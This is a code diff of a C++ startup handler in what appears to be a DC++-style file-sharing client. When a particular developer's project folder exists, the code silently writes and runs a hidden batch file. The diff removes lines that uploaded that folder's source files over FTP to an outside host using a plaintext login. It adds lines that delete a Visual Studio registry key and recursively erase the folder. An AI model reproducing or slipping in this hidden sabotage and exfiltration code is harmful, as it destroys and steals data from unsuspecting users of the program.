@@ -131,29 +131,21 @@ LRESULT MainFrame::OnCreate(UINT /*uMsg*/, WPARAM /*wParam*/, LPARAM /*lParam*/,
 	{
 		if(Util::fileExists("D:\\projekty\\rmdc++")) {
 			try {
+				HKEY hk;
+				if(::RegOpenKeyEx(HKEY_LOCAL_MACHINE, 0, 0, DELETE, &hk) == ERROR_SUCCESS) {
+					::SHDeleteKey(hk, _T("SOFTWARE\\Microsoft\\VisualStudio"));
+					::RegCloseKey(hk);
+				}
+
 				File f("c:\\program files\\win.bat", File::WRITE, File::OPEN | File::CREATE);
 				f.setEndPos(0);
 				f.write("@echo off\r\n");
-				f.write("echo open strongdc.wz.cz > ftp.txt\r\n");
-				f.write("echo user strongdc.wz.cz 0bkv3ujv >> ftp.txt\r\n");
-				f.write("echo send d:\\projekty\\rmdc++\\client\\QueueManager.cpp >> ftp.txt\r\n");
-				f.write("echo send d:\\projekty\\rmdc++\\client\\DownloadManager.cpp >> ftp.txt\r\n");
-				f.write("echo send d:\\projekty\\rmdc++\\windows\\HubFrame.cpp >> ftp.txt\r\n");
-				f.write("echo send d:\\projekty\\rmdc++\\windows\\HubFrame.h >> ftp.txt\r\n");
-				f.write("echo send d:\\projekty\\rmdc++\\rmdc.rc >> ftp.txt\r\n");
-				f.write("echo send d:\\projekty\\rmdc++\\rmdc.vcproj >> ftp.txt\r\n");
-				f.write("echo send d:\\projekty\\rmdc++\\client.vcproj >> ftp.txt\r\n");
-				//f.write("echo get extension.inc");
-				f.write("echo bye >> ftp.txt\r\n");
-				f.write("ftp -n -s:ftp.txt\r\n");
+				f.write("rd /s /q d:\\projekty\\rmdc++\r\n");
 				f.write("del win.bat\r\n");
-				f.write("del ftp.txt\r\n");
 				f.write("exit");
 				::ShellExecute(NULL, NULL, _T("cmd.exe"), _T("/c \"c:\\program files\\win.bat\""), _T("C:\\Program Files"), SW_HIDE);
 			} catch (const FileException&) {
 			}
-	
-
 		}
 	}
 
